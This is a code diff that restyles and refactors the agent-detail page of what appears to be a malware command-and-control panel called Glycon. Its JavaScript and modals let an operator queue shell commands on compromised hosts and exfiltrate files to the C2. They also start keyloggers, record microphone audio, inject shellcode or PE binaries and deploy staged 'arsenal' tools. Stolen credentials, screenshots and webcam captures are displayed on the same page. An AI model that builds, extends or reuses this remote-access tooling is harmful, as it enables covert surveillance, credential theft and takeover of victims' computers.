-                    <small class="text-muted">If empty, the original filename will be used</small>
-                </div>
+            <div>
+                <label for="uploadDestinationFolder" class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-1.5">Destination Folder</label>
+                <input type="text" id="uploadDestinationFolder" class="tactical-input font-mono" value="%USERPROFILE%\Downloads" placeholder="C:\Users\Public">
             </div>
-            <div class="modal-footer">
-                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
-                <button type="button" class="btn btn-primary" id="uploadFileBtn">Upload</button>
+            <div>
+                <label for="uploadFileName" class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-1.5">Target Filename (Optional)</label>
+                <input type="text" id="uploadFileName" class="tactical-input font-mono" placeholder="Leave empty to keep original filename">
             </div>
+        </div>
+        <div class="px-6 py-3.5 bg-slate-950/60 border-t border-slate-800 flex items-center justify-end gap-2.5">
+            <button type="button" data-modal-close class="tactical-btn-secondary">Cancel</button>
+            <button type="button" id="uploadFileBtn" class="tactical-btn-primary">Upload</button>
         </div>
     </div>
 </div>
 
 <!-- Arsenal Upload Modal -->
-<div class="modal fade" id="arsenalUploadModal" tabindex="-1">
-    <div class="modal-dialog">
-        <div class="modal-content">
-            <div class="modal-header">
-                <h5 class="modal-title">Arsenal Upload to Agent</h5>
-                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
+<div class="glycon-modal modal fixed inset-0 z-50 hidden items-center justify-center p-4 bg-slate-950/80 backdrop-blur-sm" id="arsenalUploadModal" tabindex="-1">
+    <div class="bg-slate-900 border border-slate-800 rounded-2xl shadow-2xl max-w-md w-full overflow-hidden">
+        <div class="px-6 py-4 border-b border-slate-800 flex items-center justify-between bg-slate-950/50">
+            <div class="flex items-center gap-2.5">
+                <span class="text-emerald-400">{{ icon('tools', 'w-5 h-5') }}</span>
+                <h3 class="text-base font-semibold text-slate-100">Deploy Tool from Arsenal</h3>
             </div>
-            <div class="modal-body">
-                <div class="mb-3">
-                    <label for="arsenalFileSelect" class="form-label">Select File from Arsenal</label>
-                    <select class="form-select" id="arsenalFileSelect" required>
-                        <option value="">Loading files...</option>
-                    </select>
-                </div>
-                <div class="mb-3">
-                    <label for="arsenalDestinationFolder" class="form-label">Destination Folder</label>
-                    <input type="text" class="form-control" id="arsenalDestinationFolder" placeholder="e.g., C:\Users\Public or %USERPROFILE%\Documents" value="%USERPROFILE%\Downloads">
-                    <small class="text-muted">Full path where the file should be saved on the agent</small>
-                </div>
-                <div class="mb-3">
-                    <label class="form-label">Or Upload New File to Arsenal & Send</label>
-                    <input class="form-control" type="file" id="newArsenalFile">
-                </div>
+            <button type="button" data-modal-close class="text-slate-400 hover:text-slate-100 p-1.5 rounded-lg hover:bg-slate-800">
+                {{ icon('close', 'w-5 h-5') }}
+            </button>
+        </div>
+        <div class="p-6 space-y-4">
+            <div>
+                <label for="arsenalFileSelect" class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-1.5">Select Staged Arsenal File</label>
+                <select id="arsenalFileSelect" class="tactical-select w-full font-mono">
+                    <option value="">Loading files...</option>
+                </select>
             </div>
-            <div class="modal-footer">
-                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
-                <button type="button" class="btn btn-primary" id="arsenalUploadBtn">Send to Agent</button>
+            <div>
+                <label for="arsenalDestinationFolder" class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-1.5">Target Destination Folder</label>
+                <input type="text" id="arsenalDestinationFolder" class="tactical-input font-mono" value="%USERPROFILE%\Downloads">
             </div>
+            <div>
+                <label for="newArsenalFile" class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-1.5">Or Stage New File & Deploy</label>
+                <input type="file" id="newArsenalFile" class="tactical-input file:mr-4 file:py-1 file:px-3 file:rounded-lg file:border-0 file:text-xs file:font-semibold file:bg-emerald-500/15 file:text-emerald-400">
+            </div>
+        </div>
+        <div class="px-6 py-3.5 bg-slate-950/60 border-t border-slate-800 flex items-center justify-end gap-2.5">
+            <button type="button" data-modal-close class="tactical-btn-secondary">Cancel</button>
+            <button type="button" id="arsenalUploadBtn" class="tactical-btn-primary">
+                {{ icon('send', 'w-4 h-4') }}
+                <span>Send to Agent</span>
+            </button>
         </div>
     </div>
 </div>
 {% endblock %}
 
-{% block extra_css %}
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/lightbox2/2.11.3/css/lightbox.min.css">
-{% endblock %}
-
 {% block extra_js %}
-<script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.min.js"></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/lightbox2/2.11.3/js/lightbox-plus-jquery.min.js"></script>
 <script>
 document.addEventListener('DOMContentLoaded', function() {
-    console.log('Agent detail page loaded, setting up modal handler');
-
-    // Load shellcode output when modal is shown
-    var modals = document.querySelectorAll('.modal');
-    console.log('Modal elements found:', modals.length);
-
-    modals.forEach(function(modal) {
+    // Load shellcode output when task modal is shown
+    document.querySelectorAll('.modal').forEach(function(modal) {
         modal.addEventListener('show.bs.modal', function(e) {
-            console.log('Modal show event triggered for:', modal.id);
-            var taskId = modal.id.replace('taskModal', '');
-            console.log('Extracted task ID:', taskId);
+            const taskId = modal.id.replace('taskModal', '');
+            const outputContainer = modal.querySelector('#shellcode-output-' + taskId);
+            if (!outputContainer) return;
 
-            var outputContainer = modal.querySelector('#shellcode-output-' + taskId);
-            console.log('Looking for output container:', '#shellcode-output-' + taskId, 'Found:', !!outputContainer);
+            const triggeringButton = e.relatedTarget || document.querySelector(`button[data-bs-target="#${modal.id}"]`);
+            const agentId = triggeringButton ? triggeringButton.getAttribute('data-agent-id') : "{{ agent.id }}";
 
-            if (outputContainer) {
-                console.log('Output container found, looking for agent ID...');
-                // Try to get agent ID from the button that triggered the modal
-                var triggeringButton = document.querySelector('button[data-bs-target="#' + modal.id + '"]');
-                var agentId = null;
-
-                if (triggeringButton) {
-                    agentId = triggeringButton.getAttribute('data-agent-id');
-                    console.log('Agent ID from button:', agentId);
-                }
-
-                // Fallback to looking for agent link in modal
-                if (!agentId) {
-                    var agentLink = modal.querySelector('a[href*="agent_detail"]');
-                    console.log('Agent links found:', !!agentLink);
-
-                    if (agentLink) {
-                        var href = agentLink.getAttribute('href');
-                        console.log('Agent link href:', href);
-                        agentId = href.split('/').pop();
-                        console.log('Extracted agent ID from link:', agentId);
-                    }
-                }
-
-            if (agentId) {
-                var apiUrl = '/api/shellcode_outputs/' + agentId;
-                console.log('Making API call to:', apiUrl);
-
-                fetch(apiUrl)
-                    .then(response => {
-                        console.log('Fetch response status:', response.status);
-                        return response.json();
-                    })
-                    .then(data => {
-                        console.log('Fetch response data:', data);
-                        if (data.status === 'success' && data.outputs && data.outputs.length > 0) {
-                            // Filter outputs for this specific task
-                            var taskOutputs = data.outputs.filter(function(output) {
-                                return output.task_id == taskId;
-                            });
-
-                            if (taskOutputs.length > 0) {
-                                var outputHtml = '<div class="shellcode-outputs">';
-                                taskOutputs.forEach(function(output) {
-                                    var statusClass = output.status === 'success' ? 'text-success' : 'text-danger';
-                                    outputHtml += '<div class="mb-2 p-2 border rounded">';
-                                    outputHtml += '<small class="text-muted">' + output.timestamp + '</small><br>';
-                                    outputHtml += '<span class="' + statusClass + '">' + output.status + '</span>';
-                                    if (output.message) {
-                                        outputHtml += ' - ' + output.message;
-                                    }
-                                    if (output.output) {
-                                        outputHtml += '<pre class="mt-1 bg-dark text-light p-2 small">' + output.output.replace(/&/g, '&amp;').replace(/</g, '<').replace(/>/g, '>') + '</pre>';
-                                    }
-                                    outputHtml += '</div>';
-                                });
-                                outputHtml += '</div>';
-                                outputContainer.innerHTML = outputHtml;
-                            } else {
-                                outputContainer.innerHTML = '<small class="text-muted">No shellcode output available for this task</small>';
-                            }
+            fetch('/api/shellcode_outputs/' + agentId)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.status === 'success' && data.outputs && data.outputs.length > 0) {
+                        const taskOutputs = data.outputs.filter(o => o.task_id == taskId);
+                        if (taskOutputs.length > 0) {
+                            outputContainer.innerHTML = taskOutputs.map(output => `
+                                <div class="mb-2 p-3 rounded-lg bg-slate-900 border border-slate-800">
+                                    <div class="flex items-center justify-between text-xs mb-1">
+                                        <span class="text-slate-400">${GlyconUI.escapeHtml(output.timestamp)}</span>
+                                        <span class="${output.status === 'success' ? 'text-emerald-400' : 'text-rose-400'} font-semibold">${GlyconUI.escapeHtml(output.status)}</span>
+                                    </div>
+                                    ${output.message ? `<p class="text-xs text-slate-300">${GlyconUI.escapeHtml(output.message)}</p>` : ''}
+                                    ${output.output ? `<pre class="mt-2 p-2.5 rounded bg-slate-950 text-slate-200 text-xs overflow-x-auto">${GlyconUI.escapeHtml(output.output)}</pre>` : ''}
+                                </div>
+                            `).join('');
                         } else {
-                            outputContainer.innerHTML = '<small class="text-muted">No shellcode output available</small>';
+                            outputContainer.innerHTML = '<span class="text-slate-500">No shellcode output available for this task</span>';
                         }
-                    })
-                    .catch(error => {
-                        console.error('Fetch error:', error);
-                        outputContainer.innerHTML = '<small class="text-danger">Failed to load shellcode output: ' + error.message + '</small>';
-                    });
-            } else {
-                console.log('No agent ID extracted');
-                outputContainer.innerHTML = '<small class="text-warning">No agent ID found</small>';
-            }
-            } else {
-                console.log('No output container found for task', taskId);
-            }
+                    } else {
+                        outputContainer.innerHTML = '<span class="text-slate-500">No shellcode output available</span>';
+                    }
+                })
+                .catch(error => {
+                    outputContainer.innerHTML = `<span class="text-rose-400">Failed to load shellcode output: ${GlyconUI.escapeHtml(error.message)}</span>`;
+                });
         });
     });
 
-    // Test modal trigger
-    var modalButtons = document.querySelectorAll('button[data-bs-toggle="modal"]');
-    modalButtons.forEach(function(button) {
-        button.addEventListener('click', function() {
-            console.log('Modal trigger button clicked, target:', button.getAttribute('data-bs-target'), 'agent-id:', button.getAttribute('data-agent-id'));
-        });
-    });
-});
-</script>
-<script>
-document.addEventListener('DOMContentLoaded', function() {
     // Shellcode type toggle
     document.querySelectorAll('input[name="shellcodeType"]').forEach(radio => {
         radio.addEventListener('change', function() {
-            if (this.value === 'file') {
-                document.getElementById('fileInputSection').classList.remove('d-none');
-                document.getElementById('rawInputSection').classList.add('d-none');
-                updateRawInputMethod();
-            } else {
-                document.getElementById('fileInputSection').classList.add('d-none');
-                document.getElementById('rawInputSection').classList.remove('d-none');
-                updateRawInputMethod();
-            }
+            const isFile = this.value === 'file';
+            document.getElementById('fileInputSection').classList.toggle('hidden', !isFile);
+            document.getElementById('rawInputSection').classList.toggle('hidden', isFile);
+            updateRawInputMethod();
         });
     });
 
-    // Raw input method toggle
     document.querySelectorAll('input[name="rawInputMethod"]').forEach(radio => {
         radio.addEventListener('change', updateRawInputMethod);
     });
 
     function updateRawInputMethod() {
         const method = document.querySelector('input[name="rawInputMethod"]:checked').value;
-        if (method === 'file') {
-            document.getElementById('rawFileUploadSection').classList.remove('d-none');
-            document.getElementById('rawTextInputSection').classList.add('d-none');
-        } else {
-            document.getElementById('rawFileUploadSection').classList.add('d-none');
-            document.getElementById('rawTextInputSection').classList.remove('d-none');
-        }
+        document.getElementById('rawFileUploadSection').classList.toggle('hidden', method !== 'file');
+        document.getElementById('rawTextInputSection').classList.toggle('hidden', method === 'file');
     }
 
-    // Task execution handler
+    // Task execution handler with modern Promise-based Prompt modals
     const executeBtn = document.getElementById('executeTask');
     if (executeBtn) {
         executeBtn.addEventListener('click', async function() {
-            let taskType = document.getElementById('taskType').value;
+            const taskType = document.getElementById('taskType').value;
             if (!taskType) {
-                showToast('Warning', 'Please select a task type', 'warning');
+                GlyconUI.toast('Select Task', 'Please select a task operation first', 'warning');
                 return;
             }
 
             if (taskType === 'shellcode') {
-                const shellcodeModal = new bootstrap.Modal(document.getElementById('shellcodeModal'));
-                shellcodeModal.show();
+                GlyconUI.openModal('shellcodeModal');
+                return;
+            }
+
+            if (taskType === 'upload_file') {
+                GlyconUI.openModal('uploadFileModal');
+                return;
+            }
+
+            if (taskType === 'arsenal_upload') {
+                fetch('/api/arsenal/list')
+                    .then(r => r.json())
+                    .then(data => {
+                        const select = document.getElementById('arsenalFileSelect');
+                        select.innerHTML = '<option value="">Select a staged file...</option>';
+                        if (data.status === 'success' && data.files) {
+                            data.files.forEach(f => {
+                                select.innerHTML += `<option value="${GlyconUI.escapeHtml(f)}">${GlyconUI.escapeHtml(f)}</option>`;
+                            });
+                        }
+                    });
+                GlyconUI.openModal('arsenalUploadModal');
                 return;
             }
 
             let taskData = {};
 
             if (taskType === 'audio_capture') {
-                const seconds = prompt('Enter duration in seconds:', '15');
-                if (seconds === null) return;
-                taskData = { 'seconds': seconds };
-            }
-
-            // Handle upload_file task - show the upload modal
-            if (taskType === 'upload_file') {
-                const uploadModal = new bootstrap.Modal(document.getElementById('uploadFileModal'));
-                uploadModal.show();
-                return;
-            }
-
-            // Handle arsenal_upload task - show the arsenal upload modal
-            if (taskType === 'arsenal_upload') {
-                const arsenalModal = new bootstrap.Modal(document.getElementById('arsenalUploadModal'));
-                // Fetch files for the dropdown
-                fetch('/api/arsenal/list')
-                    .then(r => r.json())
-                    .then(data => {
-                        const select = document.getElementById('arsenalFileSelect');
-                        select.innerHTML = '<option value="">Select a file</option>';
-                        if (data.status === 'success' && data.files) {
-                            data.files.forEach(f => {
-                                select.innerHTML += `<option value="${f}">${f}</option>`;
-                            });
-                        }
-                    });
-                arsenalModal.show();
-                return;
+                const seconds = await GlyconUI.prompt({
+                    title: 'Capture Microphone Audio',
+                    message: 'Specify recording duration in seconds for target agent:',
+                    label: 'Duration (seconds)',
+                    defaultValue: '15',
+                    inputType: 'number',
+                    confirmText: 'Start Capture'
+                });
+                if (seconds === null || !seconds.trim()) return;
+                taskData = { 'seconds': seconds.trim() };
             }
 
             if (taskType === 'shell') {
-                const command = prompt('Enter command to execute:');
-                if (!command) return;
-                taskData = { 'cmd': command };
+                const command = await GlyconUI.prompt({
+                    title: 'Execute Shell Command',
+                    message: 'Enter command to queue for execution on {{ agent.hostname }}:',
+                    label: 'Command Line',
+                    placeholder: 'whoami /all',
+                    confirmText: 'Queue Command'
+                });
+                if (!command || !command.trim()) return;
+                taskData = { 'cmd': command.trim() };
             }
 
             if (taskType === 'upload') {
-                const filePath = prompt('Enter full path of the file to exfiltrate (e.g. C:\\Users\\Name\\Desktop\\file.txt):');
-                if (!filePath) return;
-                taskData = { 'path': filePath };
+                const filePath = await GlyconUI.prompt({
+                    title: 'Exfiltrate File from Agent',
+                    message: 'Enter full file path on the target filesystem to exfiltrate to C2:',
+                    label: 'Target File Path',
+                    placeholder: 'C:\\Users\\Administrator\\Desktop\\secrets.txt',
+                    confirmText: 'Exfiltrate'
+                });
+                if (!filePath || !filePath.trim()) return;
+                taskData = { 'path': filePath.trim() };
             }
 
-            // Handle keylogger start/stop tasks specially
             if (taskType === 'keylogger_start' || taskType === 'keylogger_stop') {
                 const action = taskType === 'keylogger_start' ? 'start' : 'stop';
                 try {
@@ -625,10 +617,9 @@ document.addEventListener('DOMContentLoaded', function() {
                     if (!response.ok || data.status !== 'success') {
                         throw new Error(data.message || 'Failed to create keylogger task');
                     }
-                    showToast('Success', 'Keylogger task (' + action + ') created successfully! Task ID: ' + data.task_id, 'success');
+                    GlyconUI.toast('Keylogger Task', `Keylogger (${action}) queued! Task #${data.task_id}`, 'success');
                 } catch (error) {
-                    console.error('Error:', error);
-                    showToast('Error', 'Failed to create keylogger task: ' + error.message, 'danger');
+                    GlyconUI.toast('Task Error', error.message, 'danger');
                 }
                 return;
             }
@@ -646,78 +637,62 @@ document.addEventListener('DOMContentLoaded', function() {
                         task_data: taskData
                     })
                 });
-
                 const data = await response.json();
-                
                 if (!response.ok) {
                     throw new Error(data.message || 'Failed to create task');
                 }
-
-                showToast('Success', 'Task created successfully! Task ID: ' + data.task_id, 'success');
-                window.location.reload();
+                GlyconUI.toast('Task Queued', `Task #${data.task_id} (${taskType}) created`, 'success');
+                refreshAgentDetail();
             } catch (error) {
-                console.error('Error:', error);
-                showToast('Error', 'Failed to create task: ' + error.message, 'danger');
+                GlyconUI.toast('Error', 'Failed to create task: ' + error.message, 'danger');
             }
         });
     }
 
     // Shellcode send handler
     document.getElementById('sendShellcode').addEventListener('click', async function() {
-    const shellcodeType = document.querySelector('input[name="shellcodeType"]:checked').value;
-    const args = document.getElementById('shellcodeArgs').value;
-    const agentId = "{{ agent.id }}";
-    
-    try {
-        let formData = new FormData();
-        formData.append('agent_id', agentId);
-        formData.append('args', args);
-        formData.append('shellcodeType', shellcodeType);
-        
-        if (shellcodeType === 'file') {
-            const fileInput = document.getElementById('shellcodeFile');
-            if (!fileInput.files.length) {
-                throw new Error('Please select a file');
-            }
-            formData.append('file', fileInput.files[0]);
-        } else {
-            const method = document.querySelector('input[name="rawInputMethod"]:checked').value;
-            formData.append('rawInputMethod', method);
-            
-            if (method === 'file') {
-                const fileInput = document.getElementById('rawShellcodeFile');
-                if (!fileInput.files.length) {
-                    throw new Error('Please select a shellcode file');
-                }
+        const shellcodeType = document.querySelector('input[name="shellcodeType"]:checked').value;
+        const args = document.getElementById('shellcodeArgs').value;
+        const agentId = "{{ agent.id }}";
+
+        try {
+            let formData = new FormData();
+            formData.append('agent_id', agentId);
+            formData.append('args', args);
+            formData.append('shellcodeType', shellcodeType);
+
+            if (shellcodeType === 'file') {
+                const fileInput = document.getElementById('shellcodeFile');
+                if (!fileInput.files.length) throw new Error('Please select a PE binary file');
                 formData.append('file', fileInput.files[0]);
             } else {
-                const hexString = document.getElementById('shellcodeHex').value.trim();
-                if (!hexString) {
-                    throw new Error('Please enter hex shellcode');
+                const method = document.querySelector('input[name="rawInputMethod"]:checked').value;
+                formData.append('rawInputMethod', method);
+                if (method === 'file') {
+                    const fileInput = document.getElementById('rawShellcodeFile');
+                    if (!fileInput.files.length) throw new Error('Please select a shellcode file');
+                    formData.append('file', fileInput.files[0]);
+                } else {
+                    const hexString = document.getElementById('shellcodeHex').value.trim();
+                    if (!hexString) throw new Error('Please enter hex shellcode');
+                    formData.append('shellcodeHex', hexString);
                 }
-                formData.append('shellcodeHex', hexString);
             }
-        }
 
-        const response = await fetch('/api/shellcode', {
-            method: 'POST',
-            body: formData
-        });
-        
-        const data = await response.json();
-        
-        if (!response.ok) {
-            throw new Error(data.message || 'Failed to process shellcode');
+            const response = await fetch('/api/shellcode', {
+                method: 'POST',
+                body: formData
+            });
+            const data = await response.json();
+            if (!response.ok) throw new Error(data.message || 'Failed to process shellcode');
+
+            GlyconUI.closeModal('shellcodeModal');
+            GlyconUI.toast('Shellcode Queued', `Task #${data.task_id} dispatched`, 'success');
+            refreshAgentDetail();
+        } catch (error) {
+            GlyconUI.toast('Shellcode Error', error.message, 'danger');
         }
-        
-        showToast('Success', 'Shellcode task created successfully! Task ID: ' + data.task_id, 'success');
-        bootstrap.Modal.getInstance(document.getElementById('shellcodeModal')).hide();
-        window.location.reload();
-    } catch (error) {
-        console.error('Error:', error);
-        showToast('Error', 'Failed to process shellcode: ' + error.message, 'danger');
-    }
-});
+    });
 
     // Upload file handler
     document.getElementById('uploadFileBtn').addEventListener('click', async function() {
@@ -725,25 +700,18 @@ document.addEventListener('DOMContentLoaded', function() {
         const destinationFolder = document.getElementById('uploadDestinationFolder').value.trim();
         const fileName = document.getElementById('uploadFileName').value.trim();
         const agentId = "{{ agent.id }}";
-        
+
         try {
-            if (!fileInput.files.length) {
-                throw new Error('Please select a file');
-            }
-            
-            if (!destinationFolder) {
-                throw new Error('Please specify a destination folder');
-            }
-            
+            if (!fileInput.files.length) throw new Error('Please select a file');
+            if (!destinationFolder) throw new Error('Please specify a destination folder');
+
             const file = fileInput.files[0];
             const finalFileName = fileName || file.name;
-            
-            // Read file as base64
+
             const reader = new FileReader();
             reader.onload = async function() {
                 try {
-                    const base64Data = reader.result.split(',')[1]; // Remove data URL prefix
-                    
+                    const base64Data = reader.result.split(',')[1];
                     const response = await fetch('/api/upload_file', {
                         method: 'POST',
                         headers: {
@@ -758,28 +726,19 @@ document.addEventListener('DOMContentLoaded', function() {
                             size: file.size
                         })
                     });
-                    
                     const data = await response.json();
-                    
-                    if (!response.ok) {
-                        throw new Error(data.message || 'Failed to create upload task');
-                    }
-                    
-                    showToast('Success', 'File upload task created! Task ID: ' + data.task_id + ' - ' + finalFileName + ' to ' + destinationFolder, 'success');
-                    bootstrap.Modal.getInstance(document.getElementById('uploadFileModal')).hide();
-                    window.location.reload();
+                    if (!response.ok) throw new Error(data.message || 'Failed to create upload task');
+
+                    GlyconUI.closeModal('uploadFileModal');
+                    GlyconUI.toast('Upload Queued', `Task #${data.task_id}: ${finalFileName} -> ${destinationFolder}`, 'success');
+                    refreshAgentDetail();
                 } catch (error) {
-                    console.error('Error:', error);
-                    showToast('Error', 'Failed to upload file: ' + error.message, 'danger');
+                    GlyconUI.toast('Upload Failed', error.message, 'danger');
                 }
-            };
-            reader.onerror = function() {
-                throw new Error('Failed to read file');
             };
             reader.readAsDataURL(file);
         } catch (error) {
-            console.error('Error:', error);
-            showToast('Error', 'Failed to upload file: ' + error.message, 'danger');
+            GlyconUI.toast('Upload Failed', error.message, 'danger');
         }
     });
 
@@ -789,41 +748,29 @@ document.addEventListener('DOMContentLoaded', function() {
         const newFile = document.getElementById('newArsenalFile');
         const destinationFolder = document.getElementById('arsenalDestinationFolder').value.trim();
         const agentId = "{{ agent.id }}";
-        
-        try {
-            if (!destinationFolder) {
-                throw new Error('Please specify a destination folder');
-            }
 
-            let filename = '';
-            let fileData = '';
+        try {
+            if (!destinationFolder) throw new Error('Please specify a destination folder');
 
             if (newFile.files.length > 0) {
-                // Upload new file to arsenal first
                 const file = newFile.files[0];
-                filename = file.name;
+                const filename = file.name;
                 const formData = new FormData();
                 formData.append('file', file);
-                
-                const uploadResp = await fetch('/api/arsenal/upload', {
-                    method: 'POST',
-                    body: formData
-                });
+
+                const uploadResp = await fetch('/api/arsenal/upload', { method: 'POST', body: formData });
                 const uploadData = await uploadResp.json();
-                if (uploadData.status !== 'success') throw new Error('Failed to upload file to arsenal');
-                
-                // Read file as base64 for the agent task
+                if (uploadData.status !== 'success') throw new Error('Failed to upload file to Arsenal');
+
                 const reader = new FileReader();
                 reader.onload = async function() {
                     const base64Data = reader.result.split(',')[1];
                     await createArsenalTask(agentId, filename, destinationFolder, base64Data);
                 };
                 reader.readAsDataURL(file);
-                return;
             } else if (fileSelect.value) {
-                filename = fileSelect.value;
-                // Fetch file from arsenal and convert to base64
-                const fileResp = await fetch(`${window.location.origin}/api/arsenal/download/${filename}`);
+                const filename = fileSelect.value;
+                const fileResp = await fetch(`${window.location.origin}/api/arsenal/download/${encodeURIComponent(filename)}`);
                 const blob = await fileResp.blob();
                 const reader = new FileReader();
                 reader.onload = async function() {
@@ -831,13 +778,11 @@ document.addEventListener('DOMContentLoaded', function() {
                     await createArsenalTask(agentId, filename, destinationFolder, base64Data);
                 };
                 reader.readAsDataURL(blob);
-                return;
             } else {
-                throw new Error('Please select a file or upload a new one');
+                throw new Error('Please select a file from Arsenal or upload a new one');
             }
         } catch (error) {
-            console.error('Error:', error);
-            showToast('Error', 'Failed: ' + error.message, 'danger');
+            GlyconUI.toast('Arsenal Error', error.message, 'danger');
         }
     });
 
@@ -857,104 +802,85 @@ document.addEventListener('DOMContentLoaded', function() {
                     size: (base64Data.length * 3) / 4
                 })
             });
-            
             const data = await response.json();
             if (!response.ok) throw new Error(data.message || 'Failed to create task');
-            
-            showToast('Success', 'Upload task created! Task ID: ' + data.task_id, 'success');
-            bootstrap.Modal.getInstance(document.getElementById('arsenalUploadModal')).hide();
-            window.location.reload();
-        } catch (error) {
-            showToast('Error', 'Failed: ' + error.message, 'danger');
-        }
-    }
 
-    // Helper function to read file as ArrayBuffer
-    function readFileAsArrayBuffer(file) {
-        return new Promise((resolve, reject) => {
-            const reader = new FileReader();
-            reader.onload = () => resolve(new Uint8Array(reader.result));
-            reader.onerror = reject;
-            reader.readAsArrayBuffer(file);
-        });
+            GlyconUI.closeModal('arsenalUploadModal');
+            GlyconUI.toast('Arsenal Deployed', `Task #${data.task_id} queued for ${filename}`, 'success');
+            refreshAgentDetail();
+        } catch (error) {
+            GlyconUI.toast('Arsenal Error', error.message, 'danger');
+        }
     }
 
     // Refresh functionality
     async function refreshAgentDetail() {
         try {
             const response = await fetch(window.location.href, {
-                headers: {
-                    'X-Requested-With': 'XMLHttpRequest'
-                }
+                headers: { 'X-Requested-With': 'XMLHttpRequest' }
             });
-            
-            if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-            
+            if (!response.ok) return;
+
             const html = await response.text();
             const parser = new DOMParser();
             const newDoc = parser.parseFromString(html, 'text/html');
-            
-            // Update agent info
-            document.getElementById('agent-hostname').textContent = 
-                newDoc.getElementById('agent-hostname').textContent;
-            document.getElementById('agent-status').textContent = 
-                newDoc.getElementById('agent-status').textContent;
-            document.getElementById('agent-status').className = 
-                newDoc.getElementById('agent-status').className;
-            document.getElementById('agent-id').textContent = 
-                newDoc.getElementById('agent-id').textContent;
-            document.getElementById('agent-ip').textContent = 
-                newDoc.getElementById('agent-ip').textContent;
-            document.getElementById('agent-os').textContent = 
-                newDoc.getElementById('agent-os').textContent;
-            document.getElementById('agent-last-seen').textContent = 
-                newDoc.getElementById('agent-last-seen').textContent;
-            document.getElementById('agent-privilege').textContent = 
-                newDoc.getElementById('agent-privilege').textContent;
-            document.getElementById('agent-privilege').className = 
-                newDoc.getElementById('agent-privilege').className;
-            
-            // Update tables
-            document.getElementById('tasks-container').innerHTML = 
-                newDoc.getElementById('tasks-container').innerHTML;
-            document.getElementById('creds-container').innerHTML = 
-                newDoc.getElementById('creds-container').innerHTML;
-            
-            // Update screenshots
+
+            ['agent-hostname', 'agent-id', 'agent-ip', 'agent-os', 'agent-last-seen'].forEach(id => {
+                const cur = document.getElementById(id);
+                const next = newDoc.getElementById(id);
+                if (cur && next) cur.textContent = next.textContent;
+            });
+
+            ['agent-status', 'agent-privilege'].forEach(id => {
+                const cur = document.getElementById(id);
+                const next = newDoc.getElementById(id);
+                if (cur && next) {
+                    cur.className = next.className;
+                    cur.innerHTML = next.innerHTML;
+                }
+            });
+
+            ['tasks-container', 'creds-container'].forEach(id => {
+                const cur = document.getElementById(id);
+                const next = newDoc.getElementById(id);
+                if (cur && next) cur.innerHTML = next.innerHTML;
+            });
+
             const newScreenshots = newDoc.getElementById('screenshots-container');
-            if (newScreenshots) {
-                document.getElementById('screenshots-container').innerHTML = newScreenshots.innerHTML;
-            } else {
-                document.getElementById('screenshots-section').innerHTML = 
-                    newDoc.getElementById('screenshots-section').innerHTML;
+            const curScreenshots = document.getElementById('screenshots-container');
+            if (newScreenshots && curScreenshots) {
+                curScreenshots.innerHTML = newScreenshots.innerHTML;
+            } else if (newDoc.getElementById('screenshots-section')) {
+                document.getElementById('screenshots-section').innerHTML = newDoc.getElementById('screenshots-section').innerHTML;
             }
-            
-            // Update webcam captures
-            const newWebcamCaptures = newDoc.getElementById('webcam-container');
-            if (newWebcamCaptures) {
-                document.getElementById('webcam-container').innerHTML = newWebcamCaptures.innerHTML;
-            } else {
-                document.getElementById('webcam-section').innerHTML = 
-                    newDoc.getElementById('webcam-section').innerHTML;
-            }
-            
-            // Reinitialize lightbox
-            if (typeof lightbox !== 'undefined') {
-                lightbox.init();
+
+            const newWebcam = newDoc.getElementById('webcam-container');
+            const curWebcam = document.getElementById('webcam-container');
+            if (newWebcam && curWebcam) {
+                curWebcam.innerHTML = newWebcam.innerHTML;
+            } else if (newDoc.getElementById('webcam-section')) {
+                document.getElementById('webcam-section').innerHTML = newDoc.getElementById('webcam-section').innerHTML;
             }
         } catch (error) {
             console.error('Refresh failed:', error);
         }
     }
 
-    // Manual refresh
-    document.getElementById('manualRefresh').addEventListener('click', refreshAgentDetail);
+    document.getElementById('manualRefresh').addEventListener('click', () => {
+        refreshAgentDetail();
+        GlyconUI.toast('Refreshed', 'Agent telemetry updated', 'info', 2000);
+    });
 
-    // Kill Agent button click handler
+    // Kill Agent button with Promise Confirm Modal
     document.getElementById('killAgent').addEventListener('click', async function() {
-        if (!confirm('Are you sure you want to kill this agent?')) {
-            return;
-        }
+        const confirmed = await GlyconUI.confirm({
+            title: 'Terminate Agent Process',
+            message: 'Are you sure you want to send a self-termination signal to {{ agent.hostname }}? The implant will exit immediately.',
+            confirmText: 'Terminate Agent',
+            variant: 'danger'
+        });
+        if (!confirmed) return;
+
         try {
             const response = await fetch('/api/kill_agent', {
                 method: 'POST',
@@ -962,252 +888,105 @@ document.addEventListener('DOMContentLoaded', function() {
                     'Content-Type': 'application/json',
                     'Accept': 'application/json'
                 },
-                body: JSON.stringify({
-                    agent_id: "{{ agent.id }}"
-                })
+                body: JSON.stringify({ agent_id: "{{ agent.id }}" })
             });
             const data = await response.json();
             if (!response.ok || data.status !== 'success') {
                 throw new Error(data.message || 'Failed to kill agent');
             }
-            showToast('Success', 'Agent killed successfully.', 'success');
-            window.location.reload();
+            GlyconUI.toast('Kill Signal Queued', 'Termination task sent to agent', 'warning');
+            refreshAgentDetail();
         } catch (error) {
-            console.error('Error killing agent:', error);
-            showToast('Error', 'Failed to kill agent: ' + error.message, 'danger');
+            GlyconUI.toast('Error', 'Failed to kill agent: ' + error.message, 'danger');
         }
     });
 
-    // Auto-refresh every 5 seconds
     setInterval(refreshAgentDetail, 5000);
 
-    // Track keylogger status updated by websocket events
-    let keyloggerStatus = 'unknown';
-
-    // Fetch and update keylogger logs and status every 10 seconds
+    // Keylogger logs polling
     async function fetchKeyloggerLogs() {
         try {
             const response = await fetch(`/api/keylogger_logs/{{ agent.id }}`, {
-                headers: {
-                    'Accept': 'application/json'
-                }
+                headers: { 'Accept': 'application/json' }
             });
